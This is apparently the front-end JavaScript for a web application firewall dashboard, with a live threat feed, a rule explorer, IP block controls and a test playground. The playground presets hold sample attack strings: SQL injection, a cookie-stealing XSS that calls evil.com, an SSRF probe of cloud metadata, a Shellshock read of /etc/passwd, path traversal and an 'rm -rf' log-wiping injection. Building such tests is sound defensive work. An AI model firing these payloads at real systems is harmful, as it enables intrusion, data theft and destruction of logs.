/**
 * OUTLOOP WAF — Enterprise SOC Dashboard Logic
 * Core controller managing state, real-time events, API client and interactive playground components.
 */

// ── STATE CONTROLLER ────────────────────────────────────────────────
const WAF_STATE = {
  stats: {
    requestsAnalyzed: 0,
    blockedRequests: 0,
    activeRules: 57,
    blockedIps: 0,
    uptimeSeconds: 0,
    rulesByLevel: { critical: 0, high: 0, medium: 0, low: 0, other: 0 }
  },
  previousStats: null,
  threatStream: [],
  allRules: [],
  filteredRules: [],
  adminKeyConfigured: false,
  isBooted: false
};

// Preset Attack Payloads by Category
const PLAYGROUND_PAYLOADS = {
  sqli: {
    payload: "SELECT * FROM users WHERE username = 'admin' AND password = 'or 1=1 --'",
    headers: {
      "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
      "Accept": "application/json",
      "Content-Type": "application/json"
    }
  },
  xss: {
    payload: "<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>",
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
      "Accept": "text/html",
      "Referer": "https://google.com"
    }
  },
  ssrf: {
    payload: "http://169.254.169.254/latest/meta-data/local-hostname",
    headers: {
      "User-Agent": "curl/7.88.1",
      "X-Forwarded-For": "127.0.0.1"
    }
  },
  rce: {
    payload: "() { :;}; echo `/bin/cat /etc/passwd`",
    headers: {
      "User-Agent": "Shellshock-Scanner/1.0",
      "Accept-Encoding": "gzip"
    }
  },
  lfi: {
    payload: "../../../../etc/passwd\u0000",
    headers: {
      "User-Agent": "Mozilla/5.0",
      "Accept-Language": "en-US,en;q=0.9"
    }
  },
  path: {
    payload: "file:///etc/hosts",
    headers: {
      "User-Agent": "Wget/1.21.1",
      "Accept": "*/*"
    }
  },
  cmd: {
    payload: "admin; rm -rf /var/log/* &",
    headers: {
      "User-Agent": "python-requests/2.31.0",
      "Content-Type": "application/x-www-form-urlencoded"
    }
  },
  clean: {
    payload: "Search for enterprise cloud security best practices and WAF guidelines.",
    headers: {
      "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
      "Accept": "application/json"
    }
  }
};

// ── WAF API WRAPPER CLIENT ──────────────────────────────────────────
const WAF_API = {
  getHeaders() {
    const headers = {
      'X-Requested-With': 'XMLHttpRequest',
      'Content-Type': 'application/json'
    };
    const key = localStorage.getItem('waf_admin_key');
    if (key) {
      headers['X-Admin-Key'] = key;
    }
    return headers;
  },

  async request(endpoint, options = {}) {
    const url = endpoint.startsWith('/') ? endpoint : `/api/${endpoint}`;
    const headers = { ...this.getHeaders(), ...options.headers };
    
    try {
      const response = await fetch(url, { ...options, headers });
      if (response.status === 401) {
        // Admin key invalid
        WAF_API.handleUnauthorized();
        throw new Error("Unauthorized: Invalid admin key");
      }
      if (!response.ok) {
        const errData = await response.json().catch(() => ({}));
        throw new Error(errData.detail || `HTTP Error ${response.status}`);
      }
      return await response.json();
    } catch (err) {
      console.error(`API Request failed [${url}]:`, err);
      throw err;
    }
  },

  handleUnauthorized() {
    localStorage.removeItem('waf_admin_key');
    updateAdminKeyState();
    logAdminOutput("[AUTH ERROR] Unauthorized request. Admin key cleared from local storage.");
  }
};

// ── 1. BOOT LOADER SEQUENCE ──────────────────────────────────────────
async function runBootSequence() {
  const steps = [
    { id: "health", label: "Pinging WAF core service...", success: "OK", error: "FAILED" },
    { id: "version", label: "Loading system firmware and version config...", success: "OK", error: "FAILED" },
    { id: "rules", label: "Loading active signature rules (57 rules mounted)...", success: "OK", error: "FAILED" },
    { id: "connect", label: "Connecting to real-time threat stream...", success: "OK", error: "FAILED" }
  ];

  const feed = document.getElementById("boot-lines");
  if (!feed) return;

  for (let i = 0; i < steps.length; i++) {
    const step = steps[i];
    const row = document.createElement("div");
    row.className = "boot-row";
    row.innerHTML = `<span>${step.label}</span><span class="boot-line-status" id="boot-status-${step.id}">[WAIT]</span>`;
    feed.appendChild(row);
    
    // Animate item entry
    gsap.to(row, { opacity: 1, y: 0, duration: 0.2 });

    let stepSuccess = true;
    try {
      if (step.id === "health") {
        const data = await fetch("/api/health").then(res => res.json());
        stepSuccess = (data.status === "healthy");
      } else if (step.id === "version") {
        const data = await fetch("/api/version").then(res => res.json());
        document.getElementById("footer-build").textContent = data.build || "terminal-ui-v2";
        document.getElementById("footer-ver").textContent = data.version || "v1.0.0";
      } else if (step.id === "rules") {
        // Just verify detailed health metrics can load rules
        await syncStatsData();
      } else if (step.id === "connect") {
        initThreatStreamListener();
      }
    } catch (e) {
      stepSuccess = false;
      console.error("Boot step failed:", e);
    }

    const statusSpan = document.getElementById(`boot-status-${step.id}`);
    if (stepSuccess) {
      statusSpan.textContent = `[${step.success}]`;
      statusSpan.className = "boot-line-status text-green";
    } else {
      statusSpan.textContent = `[${step.error}]`;
      statusSpan.className = "boot-line-status text-red";
    }
    
    // Subtle delay
    await new Promise(resolve => setTimeout(resolve, 300));
  }

  // Complete Boot
  await new Promise(resolve => setTimeout(resolve, 400));
  gsap.to("#boot-loader", {
    opacity: 0,
    duration: 0.4,
    ease: "power2.out",
    onComplete: () => {
      document.getElementById("boot-loader").style.display = "none";
      WAF_STATE.isBooted = true;
      initDashboardAnimations();
      // Start regular metric sync
      startMetricSyncTimer();
    }
  });
}

// ── 2. LIVE CONSOLE UTILITIES ────────────────────────────────────────
const heroConsoleBody = document.getElementById("hero-terminal");
let consoleCommandTyped = false;

function typewriteHeroCommand(cmdText, onComplete) {
  const line = document.createElement("div");
  line.className = "console-line";
  line.innerHTML = `<span class="console-prompt-line">root@outloop-waf:~$</span> <span id="typing-cmd"></span>`;
  heroConsoleBody.appendChild(line);

  const cmdSpan = document.getElementById("typing-cmd");
  let idx = 0;
  const timer = setInterval(() => {
    if (idx < cmdText.length) {
      cmdSpan.textContent += cmdText[idx];
      idx++;
    } else {
      clearInterval(timer);
      cmdSpan.innerHTML += `<span class="console-cursor"></span>`;
      setTimeout(() => {
        // remove cursor
        const cursor = cmdSpan.querySelector(".console-cursor");
        if (cursor) cursor.remove();
        if (onComplete) onComplete();
      }, 500);
    }
  }, 40);
}

function writeToHeroConsole(text, isError = false) {
  const line = document.createElement("div");
  line.className = "console-line" + (isError ? " text-red" : "");
  line.innerHTML = text;
  heroConsoleBody.appendChild(line);
  heroConsoleBody.scrollTop = heroConsoleBody.scrollHeight;
}

function updateHeroConsoleState() {
  if (!heroConsoleBody) return;
  
  if (!consoleCommandTyped) {
    consoleCommandTyped = true;
    heroConsoleBody.innerHTML = "";
    typewriteHeroCommand("waf status --live", () => {
      writeToHeroConsole("● WAF Core Engine: <span class=\"text-green\">ACTIVE</span>");
      writeToHeroConsole(`● Active Rules: ${WAF_STATE.stats.activeRules} signatures loaded`);
      writeToHeroConsole(`● Requests Analyzed: ${WAF_STATE.stats.requestsAnalyzed.toLocaleString()}`);
      writeToHeroConsole(`● Threats Intercepted: ${WAF_STATE.stats.blockedRequests.toLocaleString()}`);
      writeToHeroConsole(`● Perimeter Bans: ${WAF_STATE.stats.blockedIps} IPs blocked`);
      writeToHeroConsole("● Logs stream: connected to SSE feed");
      writeToHeroConsole("<span class=\"console-prompt-line\">root@outloop-waf:~$</span> <span class=\"console-cursor\"></span>");
    });
  } else {
    // Just append updates
    const lines = heroConsoleBody.querySelectorAll(".console-line");
    if (lines.length > 2) {
      // Find prompt and refresh text below it
      heroConsoleBody.innerHTML = "";
      const headerLine = document.createElement("div");
      headerLine.className = "console-line";
      headerLine.innerHTML = `<span class="console-prompt-line">root@outloop-waf:~$</span> waf status --live`;
      heroConsoleBody.appendChild(headerLine);
      writeToHeroConsole("● WAF Core Engine: <span class=\"text-green\">ACTIVE</span>");
      writeToHeroConsole(`● Active Rules: ${WAF_STATE.stats.activeRules} signatures loaded`);
      writeToHeroConsole(`● Requests Analyzed: ${WAF_STATE.stats.requestsAnalyzed.toLocaleString()}`);
      writeToHeroConsole(`● Threats Intercepted: ${WAF_STATE.stats.blockedRequests.toLocaleString()}`);
      writeToHeroConsole(`● Perimeter Bans: ${WAF_STATE.stats.blockedIps} IPs blocked`);
      writeToHeroConsole("● Logs stream: connected to SSE feed");
      writeToHeroConsole("<span class=\"console-prompt-line\">root@outloop-waf:~$</span> <span class=\"console-cursor\"></span>");
    }
  }
}

// ── 3. METRIC COUNT-UP ANIMATION ─────────────────────────────────────
function animateMetricCounters() {
  if (!WAF_STATE.isBooted) return;

  const mapping = [
    { elId: "stat-req-val", val: WAF_STATE.stats.requestsAnalyzed, prev: WAF_STATE.previousStats?.requestsAnalyzed || 0, deltaElId: "stat-req-delta" },
    { elId: "stat-blocked-val", val: WAF_STATE.stats.blockedRequests, prev: WAF_STATE.previousStats?.blockedRequests || 0, deltaElId: "stat-blocked-delta" },
    { elId: "stat-rules-val", val: WAF_STATE.stats.activeRules, prev: WAF_STATE.previousStats?.activeRules || 57, deltaElId: null },
    { elId: "stat-ips-val", val: WAF_STATE.stats.blockedIps, prev: WAF_STATE.previousStats?.blockedIps || 0, deltaElId: "stat-ips-delta" }
  ];

  mapping.forEach(item => {
    const el = document.getElementById(item.elId);
    if (!el) return;

    if (item.prev !== item.val) {
      gsap.fromTo({ value: item.prev }, {
        value: item.val,
        duration: 1.0,
        ease: "power2.out",
        onUpdate: function() {
          el.textContent = Math.round(this.targets()[0].value).toLocaleString();
        }
      });
    } else {
      el.textContent = item.val.toLocaleString();
    }

    // Set Delta Indicators
    if (item.deltaElId) {
      const deltaEl = document.getElementById(item.deltaElId);
      if (deltaEl) {
        const diff = item.val - item.prev;
        if (diff > 0) {
          deltaEl.textContent = `+${diff} / last 15s`;
          deltaEl.className = "metric-footer trend-up";
        } else {
          deltaEl.textContent = `+0 / last 15s`;
          deltaEl.className = "metric-footer";
        }
      }
    }
  });

  // Update bottom status bar values
  const sbReq = document.getElementById("sb-req");
  const sbBlocked = document.getElementById("sb-blocked");
  const sbRules = document.getElementById("sb-rules");
  if (sbReq) sbReq.textContent = String(WAF_STATE.stats.requestsAnalyzed).padStart(5, '0');
  if (sbBlocked) sbBlocked.textContent = String(WAF_STATE.stats.blockedRequests).padStart(5, '0');
  if (sbRules) sbRules.textContent = WAF_STATE.stats.activeRules;
}

// ── 4. METRIC SYNC & DATA FETCHING ───────────────────────────────────
async function syncStatsData() {
  try {
    const data = await fetch('/api/health/detailed', {
      headers: { 'X-Requested-With': 'XMLHttpRequest' }
    }).then(res => res.json());

    if (data.components && data.components.waf_engine && data.components.waf_engine.stats) {
      const stats = data.components.waf_engine.stats;
      WAF_STATE.previousStats = WAF_STATE.stats ? { ...WAF_STATE.stats } : null;

      WAF_STATE.stats.requestsAnalyzed = stats.requests_analyzed || 0;
      WAF_STATE.stats.blockedRequests = stats.blocked_requests || 0;
      WAF_STATE.stats.blockedIps = stats.blocked_ips || 0;
      WAF_STATE.stats.activeRules = stats.total_rules || 57;
      WAF_STATE.stats.uptimeSeconds = data.uptime_seconds || 0;
      WAF_STATE.stats.rulesByLevel = stats.rules_by_level || { critical: 0, high: 0, medium: 0, low: 0, other: 0 };

      animateMetricCounters();
      updateHeroConsoleState();
      updateBreakdownProgressBars();
    }
  } catch (err) {
    console.error("Failed to sync metrics:", err);
    if (WAF_STATE.isBooted) {
      writeToHeroConsole("[SYNC ERROR] Failed to fetch live metrics from backend.", true);
    }
  }
}

function startMetricSyncTimer() {
  // Sync every 15 seconds
  setInterval(syncStatsData, 15000);
}

function updateBreakdownProgressBars() {
  const levels = WAF_STATE.stats.rulesByLevel;
  const crit = levels.critical || 0;
  const high = levels.high || 0;
  const med = levels.medium || 0;
  const low = levels.low || 0;
  const other = levels.other || 0;
  
  const total = crit + high + med + low + other || 1;

  const barMap = [
    { id: "critical", count: crit },
    { id: "high", count: high },
    { id: "medium", count: med },
    { id: "low", count: low },
    { id: "other", count: other }
  ];

  barMap.forEach(item => {
    const valSpan = document.getElementById(`breakdown-val-${item.id}`);
    const fillBar = document.getElementById(`breakdown-bar-${item.id}`);
    if (valSpan) valSpan.textContent = item.count;
    if (fillBar) {
      const pct = (item.count / total) * 100;
      fillBar.style.width = `${pct}%`;
    }
  });
}

// ── 5. INTERACTIVE PLAYGROUND & TIMELINE ──────────────────────────────
let isInspecting = false;

function loadPresetPayload(key) {
  const preset = PLAYGROUND_PAYLOADS[key];
  if (!preset) return;

  const inputEl = document.getElementById("sandbox-input");
  if (!inputEl) return;

  inputEl.value = preset.payload;
  autoResizeTextarea(inputEl);
  
  // Highlight active preset button
  document.querySelectorAll(".preset-tab-btn").forEach(btn => {
    btn.classList.remove("active");
  });
  const activeBtn = document.querySelector(`[data-preset="${key}"]`);
  if (activeBtn) activeBtn.classList.add("active");

  // Run analysis immediately for presets
  analyzeSandboxPayload();
}

function autoResizeTextarea(el) {
  el.style.height = 'auto';
  el.style.height = el.scrollHeight + 'px';
}

function updateCharCount(el) {
  const counter = document.getElementById("sandbox-char-count");
  if (counter) {
    counter.textContent = `${el.value.length} / 1000`;
  }
}

async function analyzeSandboxPayload() {
  if (isInspecting) return;
  const inputEl = document.getElementById("sandbox-input");
  if (!inputEl) return;

  const payloadText = inputEl.value.trim();
  if (!payloadText) return;

  isInspecting = true;
  document.getElementById("btn-analyze-sandbox").disabled = true;

  // Initialize Timeline Nodes (reset to normal)
  resetTimelineVisuals();
  setTimelineStepState("step-inbound", "active");

  const activeTabKey = document.querySelector(".preset-tab-btn.active")?.getAttribute("data-preset") || "custom";
  const customHeaders = PLAYGROUND_PAYLOADS[activeTabKey]?.headers || {
    "User-Agent": navigator.userAgent,
    "Accept": "*/*"
  };

  // Populate Request Panel immediately
  const reqConsole = document.getElementById("inspector-request-pane");
  let reqHeaderLines = `GET /api/secure/test?payload=${encodeURIComponent(payloadText.substring(0,60))} HTTP/1.1\n`;
  reqHeaderLines += `Host: outloop-waf.internal\n`;
  Object.entries(customHeaders).forEach(([k, v]) => {
    reqHeaderLines += `${k}: ${v}\n`;
  });
  reqConsole.textContent = reqHeaderLines;

  // Clear details
  document.getElementById("inspector-verdict-pane").innerHTML = `<div class="inspector-label-row">Loading pipeline audit logs...</div>`;

  try {
    // Step 2: Decoder Layer
    await new Promise(r => setTimeout(r, 450));
    setTimelineStepState("step-inbound", "passed");
    setTimelineStepState("step-decoder", "active");
    
    // Perform actual API inspection
    const response = await fetch(`/api/secure/test?payload=${encodeURIComponent(payloadText)}`, {
      method: 'GET',
      headers: {
        'X-Requested-With': 'XMLHttpRequest',
        ...customHeaders
      }
    });

    const isBlocked = (response.status === 403);
    const data = await response.json();

    // Step 3: Match Engine
    await new Promise(r => setTimeout(r, 450));
    setTimelineStepState("step-decoder", "passed");
    setTimelineStepState("step-match", "active");

    // Step 4: Policy Layer
    await new Promise(r => setTimeout(r, 450));
    setTimelineStepState("step-match", "passed");
    setTimelineStepState("step-policy", "active");

    // Step 5: Verdict Layer
    await new Promise(r => setTimeout(r, 450));
    setTimelineStepState("step-policy", "passed");
    setTimelineStepState("step-verdict", isBlocked ? "blocked" : "passed");

    // Display Verdict Details
    const verdictConsole = document.getElementById("inspector-verdict-pane");
    if (isBlocked) {
      // Build detailed violations log
      let auditLog = `<div class="inspector-label-row"><span class="inspector-label">Verdict:</span><span class="inspector-val text-red font-mono" style="font-weight:600;">BLOCKED (403)</span></div>`;
      auditLog += `<div class="inspector-label-row"><span class="inspector-label">Request ID:</span><span class="inspector-val">${data.request_id || "REQ-UNKNOWN"}</span></div>`;
      auditLog += `<div class="inspector-label-row"><span class="inspector-label">Client IP:</span><span class="inspector-val">${data.client_ip || "127.0.0.1"}</span></div>`;
      
      if (data.violations && data.violations.length > 0) {
        auditLog += `<div class="preset-group-title" style="margin-top:var(--space-3)">Triggered Signatures</div>`;
        data.violations.forEach(v => {
          auditLog += `
            <div style="border-left:2px solid var(--color-red); padding-left:var(--space-2); margin-top:var(--space-2)">
              <div class="inspector-label-row"><span class="inspector-label">Rule ID:</span><span class="inspector-val text-blue">${escapeHtml(v.rule_id)}</span></div>
              <div class="inspector-label-row"><span class="inspector-label">Rule Name:</span><span class="inspector-val">${escapeHtml(v.rule_name)}</span></div>
              <div class="inspector-label-row"><span class="inspector-label">Severity:</span><span class="badge ${getLevelBadgeClass(v.threat_level)}">${v.threat_level}</span></div>
              <div class="inspector-label-row"><span class="inspector-label">Match:</span><span class="inspector-val font-mono" style="color:var(--gray-400)">${escapeHtml(v.matched_content)}</span></div>
            </div>
          `;
        });
      } else {
        auditLog += `<div class="inspector-label-row"><span class="inspector-label">Reason:</span><span class="inspector-val">Perimeter filter blocked request</span></div>`;
      }
      verdictConsole.innerHTML = auditLog;
    } else {
      // Clean request details
      let auditLog = `<div class="inspector-label-row"><span class="inspector-label">Verdict:</span><span class="inspector-val text-green font-mono" style="font-weight:600;">ALLOWED (200)</span></div>`;
      auditLog += `<div class="inspector-label-row"><span class="inspector-label">Request ID:</span><span class="inspector-val">${data.waf_request_id || "REQ-UNKNOWN"}</span></div>`;
      auditLog += `<div class="inspector-label-row"><span class="inspector-label">Mitigation:</span><span class="inspector-val">None. Payload resolved clean.</span></div>`;
      auditLog += `<div class="inspector-label-row" style="margin-top:var(--space-4); color:var(--gray-400)">FastAPI routes executed correctly. Protection verified at edge proxy middleware.</div>`;
      verdictConsole.innerHTML = auditLog;
    }

    // Force metric refresh
    syncStatsData();

  } catch (err) {
    setTimelineStepState("step-verdict", "blocked");
    const verdictConsole = document.getElementById("inspector-verdict-pane");
    verdictConsole.innerHTML = `<span class="text-orange">[PIPELINE ERROR] Connection failed: ${err.message}</span>`;
  } finally {
    isInspecting = false;
    document.getElementById("btn-analyze-sandbox").disabled = false;
  }
}

function resetTimelineVisuals() {
  const steps = ["step-inbound", "step-decoder", "step-match", "step-policy", "step-verdict"];
  steps.forEach(id => {
    const el = document.getElementById(id);
    if (el) {
      el.className = "timeline-step";
    }
  });
}

function setTimelineStepState(stepId, state) {
  const el = document.getElementById(stepId);
  if (!el) return;

  el.className = "timeline-step";
  if (state === "active") {
    el.classList.add("active");
  } else if (state === "passed") {
    el.classList.add("passed");
  } else if (state === "blocked") {
    el.classList.add("blocked");
  }
}

// ── 6. REAL-TIME THREAT FEEDS (SSE) ──────────────────────────────────
let threatStreamSource = null;
let streamReconnectDelay = 1000;
let lastStreamActivity = Date.now();
let streamPulseChecker = null;

function initThreatStreamListener() {
  if (threatStreamSource) {
    threatStreamSource.close();
  }

  threatStreamSource = new EventSource('/api/events/threats');

  threatStreamSource.onopen = () => {
    streamReconnectDelay = 1000;
    lastStreamActivity = Date.now();
    logThreatStreamSystemMessage("CONNECTED", "SOC console connection established. Live stream active.");
  };

  threatStreamSource.onerror = (err) => {
    logThreatStreamSystemMessage("DISCONNECTED", `SSE connection disconnected. Reconnecting in ${streamReconnectDelay/1000}s...`, true);
    threatStreamSource.close();
    setTimeout(initThreatStreamListener, streamReconnectDelay);
    streamReconnectDelay = Math.min(streamReconnectDelay * 2, 30000);
  };

  threatStreamSource.onmessage = (event) => {
    lastStreamActivity = Date.now();
    let data;
    try {
      data = JSON.parse(event.data);
    } catch (e) {
      return;
    }

    if (data.type === 'connected') return;

    appendLiveThreatLog(data);
  };

  // Watch for silent periods (if stream hangs)
  if (!streamPulseChecker) {
    streamPulseChecker = setInterval(() => {
      if (Date.now() - lastStreamActivity > 45000) {
        // Heartbeat timeout - reconnect
        console.warn("Threat stream heartbeat timeout. Re-establishing connection.");
        initThreatStreamListener();
      }
    }, 15000);
  }
}

function logThreatStreamSystemMessage(status, message, isError = false) {
  const tbody = document.getElementById("soc-threat-logs-body");
  if (!tbody) return;

  // Clear system-message rows if connecting
  if (status === "CONNECTED") {
    const oldSysRows = tbody.querySelectorAll(".sys-msg-row");
    oldSysRows.forEach(r => r.remove());
  }

  const row = document.createElement("tr");
  row.className = "sys-msg-row";
  row.innerHTML = `
    <td colspan="5" style="text-align: center; color: ${isError ? 'var(--color-orange)' : 'var(--color-green)'}; font-style: italic; background-color: var(--gray-950);">
      [${status}] — ${message}
    </td>
  `;
  tbody.prepend(row);
}

function appendLiveThreatLog(threat) {
  const tbody = document.getElementById("soc-threat-logs-body");
  if (!tbody) return;

  // Remove empty placeholder row if present
  const placeholder = document.getElementById("soc-empty-row");
  if (placeholder) placeholder.remove();

  const tr = document.createElement("tr");
  tr.style.opacity = "0";

  const timeStr = formatISOTime(threat.timestamp || new Date().toISOString());
  const severity = (threat.threat_level || 'critical').toLowerCase();
  const ruleId = threat.rule_id || 'RULE';
  const ruleName = threat.rule_name || 'Web Attack Intercepted';
  const ip = threat.client_ip || '127.0.0.1';
  const path = threat.path || '/';

  tr.innerHTML = `
    <td style="color:var(--gray-400); white-space:nowrap;">${timeStr}</td>
    <td><span class="badge ${getLevelBadgeClass(severity)}">${severity}</span></td>
    <td class="text-blue" style="font-weight:600;">${escapeHtml(ruleId)}</td>
    <td>${escapeHtml(ruleName)}</td>
    <td style="color:var(--gray-400); text-align:right;">${escapeHtml(ip)}</td>
  `;

  tbody.prepend(tr);

  // Smooth slide-in transition
  gsap.fromTo(tr, 
    { opacity: 0, x: -10 },
    { opacity: 1, x: 0, duration: 0.35, ease: "power2.out" }
  );

  // Keep log size bounded (max 50 rows in DOM)
  while (tbody.children.length > 50) {
    tbody.lastElementChild.remove();
  }
}

function formatISOTime(isoString) {
  try {
    const d = new Date(isoString);
    const pad = (n) => String(n).padStart(2, '0');
    return `${d.getUTCFullYear()}-${pad(d.getUTCMonth()+1)}-${pad(d.getUTCDate())} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}`;
  } catch (e) {
    return '00:00:00';
  }
}

// ── 7. RULE INTELLIGENCE EXPLORER ──────────────────────────────────
async function initRuleExplorer() {
  const key = localStorage.getItem('waf_admin_key');
  if (!key) {
    renderRulesPlaceholder("[Admin authorization token is required to view signature assets. Enter token below.]");
    return;
  }

  renderRulesPlaceholder("Syncing rule signatures from WAF storage...");
  
  try {
    const data = await WAF_API.request('admin/rules');
    WAF_STATE.allRules = data.rules || [];
    WAF_STATE.filteredRules = [...WAF_STATE.allRules];
    renderRulesTableData();
  } catch (err) {
    renderRulesPlaceholder(`[SYNC ERROR] Failed to fetch signatures: ${err.message}`);
  }
}

function renderRulesPlaceholder(msg) {
  const container = document.getElementById("rules-explorer-tbody");
  if (!container) return;
  container.innerHTML = `<tr><td colspan="4" style="text-align:center; padding:var(--space-8); color:var(--gray-400);">${msg}</td></tr>`;
}

function renderRulesTableData() {
  const tbody = document.getElementById("rules-explorer-tbody");
  if (!tbody) return;

  if (WAF_STATE.filteredRules.length === 0) {
    tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; padding:var(--space-6); color:var(--gray-400);">No rule signatures matched the active search filters.</td></tr>`;
    return;
  }

  tbody.innerHTML = "";
  WAF_STATE.filteredRules.forEach(rule => {
    const tr = document.createElement("tr");
    tr.innerHTML = `
      <td class="text-blue" style="font-weight:600; width:130px;">${escapeHtml(rule.id)}</td>
      <td style="font-weight:500;">${escapeHtml(rule.name)}</td>
      <td style="width:120px;"><span class="badge ${getLevelBadgeClass(rule.threat_level)}">${escapeHtml(rule.threat_level)}</span></td>
      <td class="rule-pattern-col" title="${escapeHtml(rule.pattern)}">${escapeHtml(rule.pattern)}</td>
    `;
    tbody.appendChild(tr);
  });
}

function filterRulesExplorer() {
  const searchQuery = document.getElementById("rules-search-field").value.toLowerCase().trim();
  const severityFilter = document.getElementById("rules-filter-severity").value;

  WAF_STATE.filteredRules = WAF_STATE.allRules.filter(rule => {
    const matchesSearch = rule.id.toLowerCase().includes(searchQuery) || 
                          rule.name.toLowerCase().includes(searchQuery) ||
                          rule.pattern.toLowerCase().includes(searchQuery);

    const matchesSeverity = (severityFilter === "all") || (rule.threat_level.toLowerCase() === severityFilter);

    return matchesSearch && matchesSeverity;
  });

  renderRulesTableData();
}

// ── 8. ADMINISTRATIVE CONTROLS ─────────────────────────────────────
const adminTrigger = document.getElementById("admin-workspace-trigger");
const adminBody = document.getElementById("admin-workspace-body");

function toggleAdminWorkspace() {
  const active = adminTrigger.classList.toggle("active");
  adminTrigger.querySelector("#admin-expand-indicator").textContent = active ? "Collapse ▲" : "Expand ▼";
  adminBody.classList.toggle("active", active);
  
  if (active) {
    syncAdminState();
  }
}

function toggleAdminKeyVisibility() {
  const keyField = document.getElementById("admin-key-field");
  const btn = document.getElementById("btn-toggle-key-visible");
  const isPass = keyField.type === "password";
  keyField.type = isPass ? "text" : "password";
  btn.textContent = isPass ? "Hide" : "Show";
}

function saveAdminKey() {
  const keyField = document.getElementById("admin-key-field");
  const key = keyField.value.trim();
  
  if (key) {
    localStorage.setItem('waf_admin_key', key);
    logAdminOutput("WAF Admin token set. Checking credential authorization...");
  } else {
    localStorage.removeItem('waf_admin_key');
    logAdminOutput("WAF Admin token cleared.");
  }
  syncAdminState();
}

function syncAdminState() {
  const key = localStorage.getItem('waf_admin_key');
  const keyField = document.getElementById("admin-key-field");
  const keyStatus = document.getElementById("admin-key-status");
  const opsControls = document.getElementById("admin-ops-controls");

  if (key) {
    keyField.value = key;
    keyStatus.textContent = "✓ Authentication token loaded from storage.";
    keyStatus.className = "admin-status-text text-green";
    opsControls.style.opacity = "1";
    opsControls.style.pointerEvents = "auto";
    WAF_STATE.adminKeyConfigured = true;
    
    // Sync related views
    initRuleExplorer();
    fetchAdminStats();
    fetchAdminBlocklist();
  } else {
    keyField.value = "";
    keyStatus.textContent = "No credentials loaded. Features require X-Admin-Key configuration.";
    keyStatus.className = "admin-status-text text-orange";
    opsControls.style.opacity = "0.4";
    opsControls.style.pointerEvents = "none";
    WAF_STATE.adminKeyConfigured = false;
    
    // Revert rule view to lock message
    renderRulesPlaceholder("[Admin authorization token is required to view signature assets. Enter token below.]");
  }
}

function logAdminOutput(text) {
  const output = document.getElementById("admin-output-console");
  if (!output) return;
  output.textContent = `$ ${text}\n` + output.textContent;
}

async function fetchAdminStats() {
  logAdminOutput("waf admin stats --detailed");
  try {
    const data = await WAF_API.request('admin/stats');
    logAdminOutput("WAF System Stats details:\n" + JSON.stringify(data, null, 2));
  } catch (err) {
    logAdminOutput(`[ERROR] Stats sync failed: ${err.message}`);
  }
}

async function fetchAdminBlocklist() {
  logAdminOutput("waf blocklist show");
  try {
    const data = await WAF_API.request('admin/blocklist');
    logAdminOutput(`Banned assets: ${data.count} addresses active.`);
    renderAdminBlocklistTable(data.blocked_ips);
  } catch (err) {
    logAdminOutput(`[ERROR] Blocklist fetch failed: ${err.message}`);
  }
}

async function blockIPAddress() {
  const ipField = document.getElementById("admin-block-ip-addr");
  const reasonField = document.getElementById("admin-block-ip-reason");
  const ip = ipField.value.trim();
  const reason = reasonField.value.trim() || "Manual Administrator Ban";

  if (!ip) return;

  logAdminOutput(`waf blocklist add ${ip}`);
  try {
    const data = await WAF_API.request('admin/blocklist', {
      method: 'POST',
      body: JSON.stringify({ ip, reason })
    });
    logAdminOutput(`Successfully blocked ${ip}. Reason: ${reason}`);
    ipField.value = "";
    reasonField.value = "";
    fetchAdminBlocklist();
    syncStatsData();
  } catch (err) {
    logAdminOutput(`[ERROR] Ban target failed: ${err.message}`);
  }
}

async function unblockIPAddress(ip) {
  logAdminOutput(`waf blocklist remove ${ip}`);
  try {
    await WAF_API.request(`admin/blocklist/${ip}`, {
      method: 'DELETE'
    });
    logAdminOutput(`Banned rule for ${ip} deleted.`);
    fetchAdminBlocklist();
    syncStatsData();
  } catch (err) {
    logAdminOutput(`[ERROR] Unban target failed: ${err.message}`);
  }
}

function renderAdminBlocklistTable(ips) {
  const tbody = document.getElementById("admin-blocklist-tbody");
  if (!tbody) return;

  if (!ips || ips.length === 0) {
    tbody.innerHTML = `<tr><td colspan="3" style="text-align: center; color: var(--gray-500);">No active perimeter address blocks.</td></tr>`;
    return;
  }

  tbody.innerHTML = "";
  ips.forEach(ip => {
    const tr = document.createElement("tr");
    tr.innerHTML = `
      <td>${escapeHtml(ip)}</td>
      <td>Manual Firewall Ban</td>
      <td style="text-align: right;">
        <button class="btn btn-danger" style="padding:2px 8px; font-size:0.6875rem;" onclick="unblockIPAddress('${escapeHtml(ip)}')">Unblock</button>
      </td>
    `;
    tbody.appendChild(tr);
  });
}

// ── 9. UTILITY METHODS ────────────────────────────────────────────────
function escapeHtml(text) {
  if (!text) return '';
  return text.toString()
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function getLevelBadgeClass(lvl) {
  const l = lvl ? lvl.toLowerCase() : '';
  if (l === 'critical') return 'badge-critical';
  if (l === 'high') return 'badge-high';
  if (l === 'medium') return 'badge-medium';
  if (l === 'low' || l === 'info' || l === 'informational') return 'badge-low';
  return 'badge-ok';
}

function initDashboardAnimations() {
  gsap.registerPlugin(ScrollTrigger);
  
  // Fade and slide in layout elements as they enter viewport
  gsap.utils.toArray('[data-reveal]').forEach(el => {
    gsap.fromTo(el, 
      { opacity: 0, y: 16 },
      {
        opacity: 1,
        y: 0,
        duration: 0.6,
        ease: "power2.out",
        scrollTrigger: {
          trigger: el,
          start: "top 90%",
          once: true
        }
      }
    );
  });
}

// ── 10. SETUP & INITIALIZATION ───────────────────────────────────────
window.addEventListener("DOMContentLoaded", () => {
  // Start Boot Sequence
  setTimeout(runBootSequence, 100);

  // Set up UTC clock refresh
  setInterval(() => {
    const clock = document.getElementById("sb-time");
    if (clock) {
      const now = new Date();
      const h = String(now.getUTCHours()).padStart(2, '0');
      const m = String(now.getUTCMinutes()).padStart(2, '0');
      const s = String(now.getUTCSeconds()).padStart(2, '0');
      clock.textContent = `${h}:${m}:${s} UTC`;
    }
  }, 1000);

  // Initialize UI forms and keys
  updateAdminKeyState();
  
